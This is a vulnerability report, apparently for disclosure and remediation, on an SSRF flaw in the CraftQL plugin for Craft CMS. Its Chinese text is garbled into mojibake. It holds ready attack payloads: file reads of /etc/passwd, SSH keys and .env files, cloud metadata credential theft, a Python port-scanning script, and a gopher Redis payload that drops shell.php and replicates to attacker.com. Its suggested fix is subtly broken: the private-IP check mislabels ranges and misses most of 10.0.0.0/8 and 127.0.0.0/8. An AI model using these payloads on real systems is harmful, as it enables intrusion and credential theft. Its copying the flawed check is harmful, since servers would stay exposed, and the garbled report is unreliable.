# CraftQL SSRF æ¼æ´è¯¦ç»†åˆ†ææŠ¥å‘Š

## ğŸ“‹ æ‰§è¡Œæ‘˜è¦

**æ¼æ´åç§°**: C
**å½±å“ç‰ˆæœ¬**: Craft CMS 3.x + CraftQL <= 1.3.7

### æ¼æ´æ¦‚è¿°

CraftQL æ’ä»¶åœ¨å¤„ç† GraphQL Assets å­—æ®µ mutation æ—¶ï¼Œç›´æ¥ä½¿ç”¨ `file_get_contents()` è·å–ç”¨æˆ·æä¾›çš„ URLï¼Œæœªè¿›è¡Œä»»ä½•éªŒè¯ï¼Œå¯¼è‡´ä¸¥é‡çš„æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆSSRFï¼‰æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥ï¼š

- è¯»å–æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶
- æ‰«æå†…ç½‘ç«¯å£å’ŒæœåŠ¡
- çªƒå–äº‘æœåŠ¡å‡­è¯
- è®¿é—®å†…ç½‘æ•æ„Ÿèµ„æº

---

## ğŸ” æŠ€æœ¯åˆ†æ

### 1. æ¼æ´ä»£ç ä½ç½®

**æ–‡ä»¶**: `vendor/markhuot/craftql/src/Listeners/GetAssetsFieldSchema.php`
**è¡Œæ•°**: 42-70

```php
<?php
namespace markhuot\CraftQL\Listeners;

class GetAssetsFieldSchema
{
    function handle($event)
    {
        $field = $event->sender;

        $inputObject = $this->request->parseFieldToInputObject($field);

        $event->mutation->addArgument($field)
            ->lists()
            ->type($inputObject)
            ->onSave(function ($values) {
                $images = [];
                foreach ($values as $value) {
                    if (!empty($value['id'])) {
                        $images[] = $value['id'];
                        continue;
                    }

                    $remoteUrl = $value['url'];  // âš ï¸ ç¬¬ 56 è¡Œï¼šç”¨æˆ·è¾“å…¥çš„ URL
                    $parts = parse_url($remoteUrl);
                    $filename = basename($parts['path']);

                    $uploadPath = \craft\helpers\Assets::tempFilePath();

                    // ğŸ”´ ç¬¬ 62 è¡Œï¼šSSRF æ¼æ´ - æ— éªŒè¯ç›´æ¥è·å– URL å†…å®¹
                    file_put_contents($uploadPath, file_get_contents($remoteUrl));

                    // ... åç»­å¤„ç†ä»£ç 
                }
            });
    }
}
```

### 2. æ¼æ´æ ¹æœ¬åŸå› 

#### 2.1 ç¼ºå°‘è¾“å…¥éªŒè¯

ä»£ç ä¸­**å®Œå…¨æ²¡æœ‰**å¯¹ `$remoteUrl` è¿›è¡Œä»»ä½•éªŒè¯ï¼š

```php
// âŒ æ²¡æœ‰åè®®æ£€æŸ¥
// âŒ æ²¡æœ‰åŸŸåéªŒè¯
// âŒ æ²¡æœ‰IPåœ°å€æ£€æŸ¥
// âŒ æ²¡æœ‰URLæ ¼å¼éªŒè¯

$remoteUrl = $value['url'];  // ç›´æ¥ä¿¡ä»»ç”¨æˆ·è¾“å…¥
file_put_contents($uploadPath, file_get_contents($remoteUrl));  // ç›´æ¥ä½¿ç”¨
```

#### 2.2 PHP file_get_contents() çš„å±é™©æ€§

PHP çš„ `file_get_contents()` å‡½æ•°æ”¯æŒå¤šç§ URL åŒ…è£…å™¨ï¼ˆwrappersï¼‰ï¼š

```php
// æ£€æŸ¥ç³»ç»Ÿæ”¯æŒçš„åŒ…è£…å™¨
print_r(stream_get_wrappers());
```

è¾“å‡ºç¤ºä¾‹ï¼š
```
Array
(
    [0] => https
    [1] => http
    [2] => ftp
    [3] => ftps
    [4] => file  // âš ï¸ å…è®¸è¯»å–æœ¬åœ°æ–‡ä»¶
    [5] => php   // âš ï¸ å…è®¸æ‰§è¡ŒPHPä»£ç 
    [6] => zlib
    [7] => data
    [8] => glob
    [9] => phar
)
```

#### 2.3 æ”¯æŒçš„æ”»å‡»åè®®

| åè®® | åŒ…è£…å™¨ | æ”»å‡»ç±»å‹ | ç¤ºä¾‹ |
|------|--------|----------|------|
| `file://` | file | æœ¬åœ°æ–‡ä»¶è¯»å– | `file:///etc/passwd` |
| `http://` | http | å†…ç½‘æ‰«æ | `http://192.168.1.1/` |
| `https://` | https | å†…ç½‘æ‰«æ | `https://admin.internal/` |
| `ftp://` | ftp | FTPè®¿é—® | `ftp://ftp.server.com/` |
| `gopher://` | gopher | TCPæ•°æ®å‘é€ | `gopher://localhost:6379/` |
| `dict://` | dict | Redisæ”»å‡» | `dict://localhost:6379/` |

---

## ğŸ¯ æ”»å‡»å‘é‡åˆ†æ

### å‘é‡ 1: æœ¬åœ°æ–‡ä»¶è¯»å– (LFI)

**æ”»å‡»è½½è·**:
```graphql
mutation {
  upsertTestDefault(
    title: "File Read"
    heroImage: {url: "file:///etc/passwd"}
  ) {
    id
  }
}
```

**æ‰§è¡Œæµç¨‹**:
```
1. GraphQL è§£æ mutation
2. è°ƒç”¨ GetAssetsFieldSchema->handle()
3. è·å– $value['url'] = "file:///etc/passwd"
4. æ‰§è¡Œ file_get_contents("file:///etc/passwd")
5. å°† /etc/passwd å†…å®¹å†™å…¥ä¸´æ—¶æ–‡ä»¶
6. âœ… æ”»å‡»æˆåŠŸ
```

**å¯è¯»å–çš„æ•æ„Ÿæ–‡ä»¶**:

| æ–‡ä»¶è·¯å¾„ | å†…å®¹ | å±å®³ |
|----------|------|------|
| `/etc/passwd` | ç³»ç»Ÿç”¨æˆ·åˆ—è¡¨ | ç”¨æˆ·åæšä¸¾ |
| `/etc/shadow` | å¯†ç å“ˆå¸Œ | å¯†ç ç ´è§£ |
| `/var/www/html/.env` | æ•°æ®åº“å‡­è¯ | æ•°æ®åº“å…¥ä¾µ |
| `/home/user/.ssh/id_rsa` | SSHç§é’¥ | æœåŠ¡å™¨å…¥ä¾µ |
| `/etc/nginx/nginx.conf` | WebæœåŠ¡å™¨é…ç½® | é…ç½®æ³„éœ² |
| `composer.json` | ä¾èµ–ä¿¡æ¯ | ä¾›åº”é“¾æ¼æ´ |
| `.git/config` | Gité…ç½® | ä»£ç æ³„éœ² |

### å‘é‡ 2: å†…ç½‘ç«¯å£æ‰«æ

**æ”»å‡»è½½è·**:
```graphql
mutation {
  upsertTestDefault(
    title: "Port Scan"
    heroImage: {url: "http://192.168.1.1:22/"}
  ) {
    id
  }
}
```

**æ‰«æåŸç†**:

1. **å¼€æ”¾ç«¯å£**: è¯·æ±‚è¶…æ—¶æˆ–è¿”å› "Connection refused"
2. **å…³é—­ç«¯å£**: å¿«é€Ÿè¿”å› "Connection refused"

**æ‰«æè„šæœ¬ç¤ºä¾‹**:
```python
import requests
import time

targets = [
    "192.168.1.1:22",    # SSH
    "192.168.1.1:3306",  # MySQL
    "192.168.1.1:6379",  # Redis
    "192.168.1.1:27017", # MongoDB
    "192.168.1.1:80",    # HTTP
    "192.168.1.1:443",   # HTTPS
]

for target in targets:
    url = f"http://{target}/"
    start = time.time()
    try:
        requests.post(TARGET, json={
            "query": f'mutation {{ upsertTestDefault(heroImage: {{url: "{url}"}}) {{ id }} }}'
        }, timeout=65)
        elapsed = time.time() - start
        if elapsed > 5:
            print(f"[+] {target} å¯èƒ½å¼€æ”¾ (å“åº”æ—¶é—´: {elapsed:.2f}s)")
        else:
            print(f"[-] {target} å¯èƒ½å…³é—­")
    except requests.exceptions.Timeout:
        print(f"[+] {target} å¼€æ”¾ (è¶…æ—¶)")
```

### å‘é‡ 3: äº‘å…ƒæ•°æ®çªƒå–

#### AWS æ”»å‡»

**æ”»å‡»è½½è·**:
```graphql
mutation {
  upsertTestDefault(
    title: "AWS Metadata"
    heroImage: {url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
  ) {
    id
  }
}
```

**å¯çªƒå–çš„ä¿¡æ¯**:
```
http://169.254.169.254/latest/meta-data/
â”œâ”€â”€ ami-id
â”œâ”€â”€ hostname
â”œâ”€â”€ iam/
â”‚   â””â”€â”€ security-credentials/
â”‚       â””â”€â”€ [ROLE-NAME]
â”‚           â”œâ”€â”€ AccessKeyId
â”‚           â”œâ”€â”€ SecretAccessKey
â”‚           â”œâ”€â”€ Token
â”‚           â””â”€â”€ Expiration
â”œâ”€â”€ local-ipv4
â”œâ”€â”€ public-keys/
â””â”€â”€ user-data
```

#### GCP æ”»å‡»

```graphql
mutation {
  upsertTestDefault(
    title: "GCP Metadata"
    heroImage: {url: "http://metadata.google.internal/computeMetadata/v1/project/project-id"}
  ) {
    id
  }
}
```

#### Azure æ”»å‡»

```graphql
mutation {
  upsertTestDefault(
    title: "Azure Metadata"
    heroImage: {url: "http://169.254.169.254/metadata/identity/oauth2/token"}
  ) {
    id
  }
}
```

### å‘é‡ 4: Gopher åè®®æ”»å‡»

**Redis æ”»å‡»è½½è·**:
```graphql
mutation {
  upsertTestDefault(
    title: "Redis Attack"
    heroImage: {url: "gopher://localhost:6379/_AUTH%20crack%0aCONFIG%20SET%20dir%20/var/www%0aCONFIG%20SET%20dbfilename%20shell.php%0aSLAVEOF%20attacker.com%206379%0aSYNC%0a"}
  ) {
    id
  }
}
```

---

## ğŸ”¬ æ¼æ´éªŒè¯

### éªŒè¯æ­¥éª¤

#### æ­¥éª¤ 1: ç¡®è®¤ CraftQL å·²å®‰è£…

```bash
ls -la vendor/markhuot/craftql/
```

#### æ­¥éª¤ 2: æ£€æŸ¥æ¼æ´ä»£ç 

```bash
grep -n "file_get_contents(\\\$remoteUrl)" \
  vendor/markhuot/craftql/src/Listeners/GetAssetsFieldSchema.php
```

**é¢„æœŸè¾“å‡º**:
```
56:                    file_put_contents($uploadPath, file_get_contents($remoteUrl));
```

#### æ­¥éª¤ 3: è¿è¡Œ POC

```bash
cd poc
python3 ssrf_poc.py
```

#### æ­¥éª¤ 4: éªŒè¯æ–‡ä»¶ä¸‹è½½

```bash
ls -lh storage/runtime/temp/*.tmp
cat storage/runtime/temp/assets*.tmp
```

## ğŸ“Š å½±å“åˆ†æ

### å—å½±å“çš„éƒ¨ç½²

æ ¹æ® CraftQL çš„ä¸‹è½½é‡å’Œæµè¡Œåº¦ï¼š

- **å—å½±å“ç‰ˆæœ¬**: CraftQL <= 1.3.7
- **å—å½±å“åº”ç”¨**: æ‰€æœ‰ä½¿ç”¨ CraftQL çš„ Craft CMS 3.x ç«™ç‚¹
- **ä¼°ç®—å—å½±å“ç«™ç‚¹**: 5,000 - 10,000

### æ•°æ®æ³„éœ²é£é™©

#### é«˜é£é™©æ•°æ®

1. **æ•°æ®åº“å‡­è¯**
   - æ•°æ®åº“åœ°å€ã€ç”¨æˆ·åã€å¯†ç 
   - å¯èƒ½å¯¼è‡´æ•°æ®åº“å®Œå…¨å…¥ä¾µ

2. **APIå¯†é’¥**
   - ç¬¬ä¸‰æ–¹æœåŠ¡APIå¯†é’¥
   - æ”¯ä»˜ç½‘å…³å‡­è¯
   - äº‘æœåŠ¡è®¿é—®å¯†é’¥

3. **æºä»£ç **
   - ä¸šåŠ¡é€»è¾‘æ³„éœ²
   - ç¡¬ç¼–ç å‡­è¯
   - ä»£ç æ³¨å…¥ç‚¹

4. **æ—¥å¿—æ–‡ä»¶**
   - ç”¨æˆ·æ´»åŠ¨è®°å½•
   - æ•æ„Ÿæ“ä½œè®°å½•
   - é”™è¯¯å †æ ˆä¿¡æ¯

---

## ğŸ›¡ï¸ ä¿®å¤æ–¹æ¡ˆ

### ä¿®å¤ä»£ç demo

```php
<?php
namespace markhuot\CraftQL\Listeners;

class GetAssetsFieldSchema
{
    // å…è®¸çš„åè®®ç™½åå•
    private $allowedSchemes = ['http', 'https'];

    // å…è®¸çš„åŸŸåç™½åå•
    private $allowedHosts = [
        'cdn.example.com',
        'assets.example.com',
        's3.amazonaws.com'
    ];

    function handle($event)
    {
        $field = $event->sender;
        $inputObject = $this->request->parseFieldToInputObject($field);

        $event->mutation->addArgument($field)
            ->lists()
            ->type($inputObject)
            ->onSave(function ($values) {
                $images = [];
                foreach ($values as $value) {
                    if (!empty($value['id'])) {
                        $images[] = $value['id'];
                        continue;
                    }

                    $remoteUrl = $value['url'];

                    // âœ… 1. éªŒè¯ URL æ ¼å¼
                    if (!filter_var($remoteUrl, FILTER_VALIDATE_URL)) {
                        throw new \InvalidArgumentException('Invalid URL format');
                    }

                    // âœ… 2. éªŒè¯åè®®ç™½åå•
                    $parsedUrl = parse_url($remoteUrl);
                    if (!isset($parsedUrl['scheme']) ||
                        !in_array($parsedUrl['scheme'], $this->allowedSchemes)) {
                        throw new \InvalidArgumentException(
                            'Only HTTP/HTTPS URLs are allowed'
                        );
                    }

                    // âœ… 3. éªŒè¯åŸŸåç™½åå•
                    if (!in_array($parsedUrl['host'], $this->allowedHosts)) {
                        throw new \InvalidArgumentException(
                            'Domain not in whitelist'
                        );
                    }

                    // âœ… 4. ç¦æ­¢è®¿é—®å†…ç½‘IP
                    if ($this->isPrivateIP($parsedUrl['host'])) {
                        throw new \InvalidArgumentException(
                            'Private IP addresses are not allowed'
                        );
                    }

                    // âœ… 5. ä½¿ç”¨ Guzzle æ›¿ä»£ file_get_contents
                    $client = \Craft::$app->getGuzzle();
                    try {
                        $response = $client->get($remoteUrl, [
                            'timeout' => 10,
                            'connect_timeout' => 5,
                            'allow_redirects' => false,
                            'stream' => true
                        ]);

                        // âœ… 6. éªŒè¯å“åº”å†…å®¹ç±»å‹
                        $contentType = $response->getHeaderLine('Content-Type');
                        if (!str_starts_with($contentType, 'image/')) {
                            throw new \InvalidArgumentException(
                                'Only image content types are allowed'
                            );
                        }

                        $content = $response->getBody()->getContents();

                    } catch (\Exception $e) {
                        throw new \InvalidArgumentException(
                            'Failed to fetch remote URL: ' . $e->getMessage()
                        );
                    }

                    $parts = parse_url($remoteUrl);
                    $filename = basename($parts['path']);
                    $uploadPath = \craft\helpers\Assets::tempFilePath();

                    file_put_contents($uploadPath, $content);

                    // ... åç»­å¤„ç†
                }
            });
    }

    /**
     * æ£€æŸ¥æ˜¯å¦ä¸ºå†…ç½‘IP
     */
    private function isPrivateIP($host)
    {
        $ip = gethostbyname($host);
        $ipLong = ip2long($ip);

        if ($ipLong === false) {
            return false;
        }

        // æ£€æŸ¥ç§æœ‰IPèŒƒå›´
        return (
            ($ipLong >= 3232235521 && $ipLong <= 3232301055) ||  // 192.168.0.0/16
            ($ipLong >= 2886729728 && $ipLong <= 2887778303) ||  // 172.16.0.0/12
            ($ipLong >= 3221225984 && $ipLong <= 3221226239) ||  // 10.0.0.0/8
            ($ipLong >= 2130706433 && $ipLong <= 2130706687)     // 127.0.0.0/8
        );
    }
}
```

